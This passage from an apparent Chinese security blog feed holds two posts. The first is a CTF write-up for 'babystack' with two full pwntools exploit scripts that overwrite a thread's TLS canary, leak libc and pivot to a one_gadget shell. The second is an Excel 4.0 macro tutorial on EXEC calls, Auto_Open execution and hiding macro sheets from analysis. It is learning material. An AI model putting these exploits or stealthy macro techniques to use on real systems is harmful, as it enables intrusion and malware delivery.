class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">get_long</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">8</span>];</span><br><span class="line">    fgets(buf, <span class="number">8</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">size_t</span>)atol(buf);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">readn</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">char</span> *buf, <span class="keyword">size_t</span> n)</span> </span>&#123;</span><br><span class="line"><span class="keyword">size_t</span> rc;</span><br><span class="line"><span class="keyword">size_t</span> nread = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (nread &lt; n) &#123;</span><br><span class="line">rc = read(fd, &amp;buf[nread], n-nread);</span><br><span class="line"><span class="keyword">if</span> (rc == <span class="number">-1</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (errno == EAGAIN || errno == EINTR) &#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (rc == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">nread += rc;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> nread;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> * <span class="title">start</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line">    <span class="keyword">char</span> input[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="built_in">memset</span>(input, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Welcome to babystack 2018!&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;How many bytes do you want to send?&quot;</span>);</span><br><span class="line">    size = get_long();</span><br><span class="line">    <span class="keyword">if</span> (size &gt; <span class="number">0x10000</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;You are greedy!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    readn(<span class="number">0</span>, input, size);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;It&#x27;s time to say goodbye.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">pthread_t</span> t;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot; #   #    ####    #####  ######&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;  # #    #    #     #    #&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;### ###  #          #    #####&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;  # #    #          #    #&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot; #   #   #    #     #    #&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;          ####      #    #&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    pthread_create(&amp;t, <span class="literal">NULL</span>, &amp;start, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (pthread_join(t, <span class="literal">NULL</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;exit failure&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Bye bye&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="大体思路"><a href="#大体思路" class="headerlink" title="大体思路"></a>大体思路</h5><ul><li>通过padding爆破填充a修改TLS中的canary为aaaaaaaa，从而绕过栈溢出保护（这里必须是线程的题目，而且输入足够大才行！）</li><li>泄露出puts的got地址得到真实的基地址，用于getshell</li><li>利用栈迁移，在bss段中开辟一个空间来写one_gadget来payload</li></ul><p>我们看多线程中的反汇编函数，可以看到参数s的大小是<strong>0x1010</strong>，而v2可以允许<strong>0x10000</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *__fastcall <span class="title">start_routine</span><span class="params">(<span class="keyword">void</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-1018h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+10h] [rbp-1010h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+1018h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x1000</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to babystack 2018!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;How many bytes do you want to send?&quot;</span>);</span><br><span class="line">  v2 = sub_400906(<span class="string">&quot;How many bytes do you want to send?&quot;</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt;= <span class="number">0x10000</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_400957(<span class="number">0LL</span>, &amp;s, v2);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;It&#x27;s time to say goodbye.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You are greedy!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后看sub_400906函数，结合上个函数的传参可以看到read函数有明显的溢出，但是有canary保护，而且是线程，所以我们这里学习一种新招式，TSL（线程局部存储）攻击，基本思路就是我们得覆盖很多个a到高地址，直到把TLS给覆盖从而修改了canary的值为a，绕过了canary后就可以栈溢出操作了。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 __fastcall <span class="title">sub_400957</span><span class="params">(<span class="keyword">int</span> a1, __int64 a2, <span class="keyword">unsigned</span> __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">ssize_t</span> v6; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = a3;</span><br><span class="line">  v5 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v5 &lt; v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = read(a1, (<span class="keyword">void</span> *)(v5 + a2), v4 - v5);</span><br><span class="line">    <span class="keyword">if</span> ( v6 == <span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *_errno_location() != <span class="number">11</span> &amp;&amp; *_errno_location() != <span class="number">4</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !v6 )</span><br><span class="line">        <span class="keyword">return</span> v5;</span><br><span class="line">      v5 += v6;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查找值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">ascotbe@ubuntu:~/Desktop/PWN$ ROPgadget --binary babystack --only <span class="string">&quot;pop|ret&quot;</span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x0000000000400bfc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400bfe : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400c00 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400c02 : pop r15 ; ret</span><br><span class="line">0x0000000000400bfb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400bff : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400870 : pop rbp ; ret</span><br><span class="line">0x0000000000400c03 : pop rdi ; ret</span><br><span class="line">0x0000000000400c01 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x0000000000400bfd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400791 : ret</span><br><span class="line">0x000000000040028b : ret 0x2800</span><br><span class="line">0x000000000040097e : ret 0x8b48</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 13</span><br></pre></td></tr></table></figure><p>主要就是覆盖TLS中的cancry值，然后加上ret2libc3题目的操作即可</p><div class="note warning modern"><p>下面两个POC都能跑，但是没搞懂如何计算出来的TLS长度为6218的。。。。</p></div><p>POC1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> context.quiet:</span><br><span class="line">    p = process(<span class="string">&#x27;./babystack&#x27;</span>, env = &#123;<span class="string">&#x27;LD_PRELOAD&#x27;</span>: <span class="string">&#x27;./libc-2.23.so&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;How many bytes do you want to send?\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">0x1010</span> + <span class="number">2008</span> + <span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># puts(atol@GOT) to leak a libc address</span></span><br><span class="line">    payload  = p64(<span class="number">0x400c03</span>) <span class="comment"># pop rdi; ret;</span></span><br><span class="line">    payload += p64(<span class="number">0x601ff0</span>) <span class="comment"># rdi &lt;= atol@GOT</span></span><br><span class="line">    payload += p64(<span class="number">0x4007c0</span>) <span class="comment"># jmp puts@PLT</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># read(0, 0x602030, SIZE) to write the final payload somewhere in .bss</span></span><br><span class="line">    <span class="comment"># luckily, there is a large value in rdx, so we don&#x27;t need to provide it here</span></span><br><span class="line">    payload += p64(<span class="number">0x400c03</span>) <span class="comment"># pop rdi; ret;</span></span><br><span class="line">    payload += p64(<span class="number">0</span>)        <span class="comment"># rdi &lt;= stdin</span></span><br><span class="line">    payload += p64(<span class="number">0x400c01</span>) <span class="comment"># pop rsi; pop r15; ret;</span></span><br><span class="line">    payload += p64(<span class="number">0x602030</span>) <span class="comment"># rsi &lt;= 0x602030 (somewhere in .bss)</span></span><br><span class="line">    payload += p64(<span class="number">0</span>)        <span class="comment"># r15 &lt;= garbage</span></span><br><span class="line">    payload += p64(<span class="number">0x4007e0</span>) <span class="comment"># jmp read@PLT</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># pivot rsp into somewhere in .bss</span></span><br><span class="line">    payload += p64(<span class="number">0x400bfd</span>) <span class="comment"># pop rsp; pop r13; pop r14; pop r15; ret</span></span><br><span class="line">    payload += p64(<span class="number">0x602030</span>) <span class="comment"># rsp &lt;= 0x602030 (somewhere in .bss)</span></span><br><span class="line"></span><br><span class="line">    p.send(</span><br><span class="line">        <span class="comment"># garbage to fill out the buffer up to canary</span></span><br><span class="line">        <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x1010</span> - <span class="number">8</span>) + \</span><br><span class="line">        <span class="comment"># fake canary</span></span><br><span class="line">        <span class="string">&#x27;b&#x27;</span> * <span class="number">8</span> + \</span><br><span class="line">        <span class="comment"># saved rbp</span></span><br><span class="line">        <span class="string">&#x27;c&#x27;</span> * <span class="number">8</span> + \</span><br><span class="line">        <span class="comment"># return address + ROP chain</span></span><br><span class="line">        payload + \</span><br><span class="line">        <span class="comment"># garbage</span></span><br><span class="line">        <span class="string">&#x27;d&#x27;</span> * (<span class="number">2000</span> - <span class="built_in">len</span>(payload)) + \</span><br><span class="line">        <span class="comment"># replace thread&#x27;s stack guard with our fake canary</span></span><br><span class="line">        <span class="string">&#x27;b&#x27;</span> * <span class="number">8</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># here the content of atol@GOT is printed</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;It&#x27;s time to say goodbye.\n&quot;</span>)</span><br><span class="line">    libc_base = u64(p.recv(<span class="number">6</span>) + <span class="string">&#x27;\x00\x00&#x27;</span>) - <span class="number">0x36ea0</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;libc base: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x4526aexecve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">    constraints:</span></span><br><span class="line"><span class="string">        [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    one_gadget = libc_base + <span class="number">0x4526a</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;one gadget: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(one_gadget))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># here we provide the final payload for exploitation</span></span><br><span class="line">    <span class="comment"># since rsp is pivoted, we provide the rest of data here</span></span><br><span class="line">    p.sendline(</span><br><span class="line">        <span class="comment"># pop r13; pop r14; pop r15; ret</span></span><br><span class="line">        <span class="comment"># writing garbage to r13, r14, and r15</span></span><br><span class="line">        p64(<span class="number">0</span>) * <span class="number">3</span> + \</span><br><span class="line">        <span class="comment"># after above ret, the shell will be executed</span></span><br><span class="line">        p64(one_gadget) + \</span><br><span class="line">        <span class="comment"># write enough zeros in order to satify [rsp+0x30] == NULL constraint</span></span><br><span class="line">        <span class="string">&#x27;\x00&#x27;</span> * <span class="number">0x40</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>POC2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params"><span class="built_in">bytes</span>,data</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;How many bytes do you want to send?\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">bytes</span>))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    io.send(data)</span><br><span class="line"></span><br><span class="line">puts_plt = <span class="number">0x4007C0</span></span><br><span class="line">read_plt = <span class="number">0x4007E0</span> </span><br><span class="line">leave_addr = <span class="number">0x400A9B</span></span><br><span class="line"></span><br><span class="line">pop_rdi_addr = <span class="number">0x400c03</span></span><br><span class="line">puts_got = <span class="number">0x601FB0</span></span><br><span class="line">pop_rbp_addr = <span class="number">0x400870</span></span><br><span class="line">pop_rsi_addr = <span class="number">0x400c01</span></span><br><span class="line"></span><br><span class="line">bss_addr = <span class="number">0x602030</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./bs&#x27;</span>,env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : <span class="string">&quot;./libc-2.23.so&quot;</span>&#125;)</span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x1010</span>+p64(bss_addr-<span class="number">0x8</span>)+p64(pop_rdi_addr) + p64(puts_got) + p64(puts_plt)</span><br><span class="line">payload += p64(pop_rdi_addr) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi_addr) + p64(bss_addr) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(read_plt) + p64(leave_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x2000</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">menu(<span class="number">0x2000</span>,payload)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;It\&#x27;s time to say goodbye.\n&#x27;</span>)</span><br><span class="line">base = u64(io.recv(<span class="number">6</span>)+<span class="string">&#x27;\x00\x00&#x27;</span>)-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">io.send(p64(base+<span class="number">0xf1147</span>))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">《ctf竞赛权威指南（PWN篇）》</span><br><span class="line">https:&#x2F;&#x2F;ctf-wiki.org&#x2F;pwn&#x2F;linux&#x2F;mitigation&#x2F;canary&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;www.jianshu.com&#x2F;p&#x2F;b0b254b94afe</span><br><span class="line">http:&#x2F;&#x2F;6par.top&#x2F;2020&#x2F;07&#x2F;05&#x2F;%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;www.int0x80.top&#x2F;BypassCanary&#x2F;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Office Excel Macro</title>
    <link href="https://www.ascotbe.com/2021/01/27/OfficeExcelMacro/"/>
    <id>https://www.ascotbe.com/2021/01/27/OfficeExcelMacro/</id>
    <published>2021-01-27T10:45:42.000Z</published>
    <updated>2021-05-04T06:03:28.416Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>声明</p></blockquote><p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p><blockquote><p>前言</p></blockquote><p>好久没笼统的学习了，梳理下Excel宏相关的东西以防下次要用的时候都不会。</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/OfficeExcelMacro/1.png?raw=true" alt="image-20210128134158060"></p><h3 id="关于宏"><a href="#关于宏" class="headerlink" title="关于宏"></a>关于宏</h3><p>据我所知微软office所支持的宏里面，目前有两种</p><ul><li>1992年：微软在office中引用了名为Excel4.0的宏代码技术，也被成为XLM宏。Excel4.0宏代码写在表格中，宏代码的具体文件呈现为xml而不是二进制文件。</li><li>1993年：微软更新了Excel5.0技术，也就是现在常见的VBA宏代码。</li></ul><p>从Excel2010到Excel2019全线产品都支持Excel4.0宏。同时微软也提到，虽然目前Microsoft Excel仍然支持Excel4.0宏，但还是建议用户使用VBA宏。</p><h3 id="Macro-4-0"><a href="#Macro-4-0" class="headerlink" title="Macro 4.0"></a>Macro 4.0</h3><h4 id="简单利用"><a href="#简单利用" class="headerlink" title="简单利用"></a>简单利用</h4><p>在箭头位置点击右键-&gt;插入即可使用</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/OfficeExcelMacro/2.png?raw=true" alt="image-20210126164024520"></p><p>接着会出现一个新建的宏表格，我们在表格中添加如下命令，即可完成一个简单的宏</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;EXEC(&quot;calc.exe&quot;)</span><br><span class="line">&#x3D;ALERT(&quot;hello ascotbe~&quot;)</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/OfficeExcelMacro/3.gif?raw=true" alt="1"></p><h4 id="隐蔽性"><a href="#隐蔽性" class="headerlink" title="隐蔽性"></a>隐蔽性</h4><p>可以见到使用XLM宏比常见的VBA宏具有更好的免杀性，主要原因XLM宏和VBA宏的设计理念不同，导致了宏代码在文件结构中的呈现不同，和VBA宏一样的是，在文件打开时，Excel依旧会提醒用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Because of your security settings, macros have been disabled. To run macros, you need to reopen this workbook, and then choose to enable macros. For more information about enabling macros, click Help.</span><br></pre></td></tr></table></figure><p>不同的是，当用户单击启用之后，ALT + F11打开宏代码窗口，却并不能看到宏代码。也不能通过一些常见的宏代码提取工具检测分析宏。</p><p>这是因为默认情况下，XLM宏代码存储在<code>ascotbe.xlsm\xl\Macrosheets\Sheet1.xml</code>。打开该xml文件，可以清晰的看到刚才在Excel工作表中插入的宏代码。</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/OfficeExcelMacro/4.png?raw=true" alt="image-20210126173824786"></p><h4 id="自动加载"><a href="#自动加载" class="headerlink" title="自动加载"></a>自动加载</h4><ul><li>Auto_Open：在用户打开文档的时候自动运行（如果用户允许执行宏代码）</li><li>Auto_Close：在用户关闭文档的时候自动运行（如果用户允许执行宏代码）</li></ul><p>XLM宏只需要将需要执行宏的单元格名称设置为Auto_Open或Auto_Close即可实现宏代码的自动加载。</p><h5 id="设置单元格名称"><a href="#设置单元格名称" class="headerlink" title="设置单元格名称"></a>设置单元格名称</h5><p>点击一个单元格，然后选着公式-&gt;定义的名称-&gt;定义名称即可设置成功</p><h5 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h5><p>没有设置Auto_Close关闭文档，可以看到无任何反应，当我们设置了以后关闭，弹出了计算器和弹窗</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/OfficeExcelMacro/5.gif?raw=true" alt="2"></p><h4 id="隐藏方式"><a href="#隐藏方式" class="headerlink" title="隐藏方式"></a>隐藏方式</h4><h5 id="简单的隐藏"><a href="#简单的隐藏" class="headerlink" title="简单的隐藏"></a>简单的隐藏</h5><p>左下角隐藏，可以通过右键-&gt;取消隐藏来显示</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/OfficeExcelMacro/6.png?raw=true" alt="image-20210127104310071"></p><p>列隐藏，可以看到正常都是从A1开始的表格，隐藏了列以后变成了从D1开始了，并且进度条是拉倒最左边的</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/OfficeExcelMacro/7.png?raw=true" alt="image-20210127104449564"></p><h5 id="进制隐藏"><a href="#进制隐藏" class="headerlink" title="进制隐藏"></a>进制隐藏</h5><p>这种隐藏方式如果使用<code>xlsm</code>后缀格式的话是无法利用的，但是xls格式是可以的，通过全局搜索字符串<code>sheet1</code>找到后面十六进制是<strong>85 00</strong>开头的位置，然后往后数九个字节，可以看到框起来的最后一个字节是01</p><ul><li>00:表示不隐藏</li><li>01:表示浅隐藏（可通过鼠标右键取消隐藏）</li><li>02:表示深度隐藏（无法在Excel中找到）</li></ul><p><img src="https://github.com/Ascotbe/Random-img/blob/master/OfficeExcelMacro/8.png?raw=true" alt="image-20210127181124488"></p><p>具体效果可以看图</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/OfficeExcelMacro/9.gif?raw=true" alt="3"></p><h4 id="一个案例"><a href="#一个案例" class="headerlink" title="一个案例"></a>一个案例</h4><p>样本下载地址<a href="https://app.any.run/tasks/aaf8a9aa-5068-42dd-89cf-cd610ce5e730/">点我</a>，备份地址<a href="https://github.com/Ascotbe/Random-img/blob/master/OfficeExcelMacro/Info_695.xls.zip">下载</a>，下面是样本的截图</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/OfficeExcelMacro/10.png?raw=true" alt="img"></p><h5 id="如何定位该样本的隐藏宏位置"><a href="#如何定位该样本的隐藏宏位置" class="headerlink" title="如何定位该样本的隐藏宏位置"></a>如何定位该样本的隐藏宏位置</h5><p>下载项目</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;DidierStevens&#x2F;DidierStevensSuite</span><br></pre></td></tr></table></figure><p>然后执行以下命令</p><figure class="highlight 